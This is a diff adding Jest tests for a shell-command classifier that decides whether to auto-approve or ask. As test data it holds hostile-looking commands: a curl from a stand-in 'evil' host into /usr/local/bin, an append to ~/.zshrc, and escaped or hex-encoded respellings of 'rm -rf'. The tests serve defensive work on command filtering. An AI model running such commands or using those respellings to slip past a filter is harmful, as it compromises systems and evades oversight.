@@ -107,3 +107,50 @@ describe("classifyCommand — compound / nested", () => {
     expect(c.matched).toBe("git")
   })
 })
+
+describe("redirects gate the verdict", () => {
+  it("refuses to auto-approve a safe command that writes a file", () => {
+    // Before the classifier saw redirects this was "read-only network fetch".
+    const v = classifyCommand("curl https://evil.sh > /usr/local/bin/y")
+    expect(v.verdict).toBe("ask")
+    expect(v.reason).toMatch(/redirects output into \/usr\/local\/bin\/y/)
+  })
+
+  it("refuses to auto-approve an append into a shell profile", () => {
+    expect(classifyCommand("echo evil >> ~/.zshrc").verdict).toBe("ask")
+  })
+
+  it("still auto-approves a discard redirect", () => {
+    expect(classifyCommand("cat x > /dev/null").verdict).toBe("allow")
+    expect(classifyCommand("ls &> /dev/null").verdict).toBe("allow")
+  })
+
+  it("still auto-approves a descriptor duplication", () => {
+    expect(classifyCommand("echo hi 2>&1").verdict).toBe("allow")
+  })
+
+  it("does not escalate a read redirect", () => {
+    expect(classifyCommand("sort < in.txt").verdict).toBe("allow")
+  })
+
+  it("keeps the more severe head verdict when both apply", () => {
+    const v = classifyCommand("git push --force > log.txt")
+    expect(v.verdict).toBe("ask")
+    expect(v.reason).toMatch(/git push/)
+  })
+})
+
+describe("respelt heads classify like the command they run", () => {
+  it.each([
+    "rm -rf /tmp/x",
+    "r\\m -rf /tmp/x",
+    "\\rm -rf /tmp/x",
+    "$'\\x72\\x6d' -rf /tmp/x",
+    '"rm" -rf /tmp/x',
+    "/usr/bin/rm -rf /tmp/x",
+  ])("classifies %s as a deletion", (command) => {
+    const v = classifyCommand(command)
+    expect(v.matched).toBe("rm")
+    expect(v.reason).toMatch(/delete/i)
+  })
+})
